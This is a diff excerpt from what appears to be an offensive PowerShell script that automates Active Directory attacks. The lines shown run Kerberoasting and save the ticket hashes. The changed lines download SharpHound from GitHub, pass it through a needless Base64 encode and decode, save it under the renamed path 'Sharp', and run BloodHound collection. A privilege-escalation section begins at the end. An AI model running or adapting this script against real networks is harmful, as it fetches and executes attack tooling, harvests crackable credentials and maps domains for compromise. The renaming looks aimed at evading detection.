@@ -63,17 +63,20 @@ Write-Host "Running Kerberoast" -ForegroundColor  Yellow
 Invoke-Kerberoast | Out-File $path\Kerberoast.krb 
 
 #SharpHound
-If(!(test-path $modulepath/SharpHound))
+If(!(test-path $modulepath/Sharp))
 {
-      New-Item -ItemType Directory -Force -Path $modulepath/SharpHound | Out-Null
+      New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
 }
 Write-Host "Fetching SharpHound module..." 
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1","$modulepath/SharpHound/SharpHound.ps1")
+$download = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1")
+$Encode = [System.Text.Encoding]::Unicode.GetBytes(($download))
+$Base64 = [Convert]::ToBase64String($Encode)
+$Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Base64))
+$Decoded > $modulepath/Sharp/Sharp.ps1
 Write-Host "Importing module..." 
-Import-Module SharpHound.ps1
+Import-Module Sharp.ps1
 Write-Host "Running SharpHound" -ForegroundColor  Yellow
-Invoke-BloodHound -CSVFolder C:\Capture | Out-Null
+Invoke-BloodHound -CSVFolder $path | Out-Null
 
 #PrivEsc
 If(!(test-path $modulepath/PrivEsc))
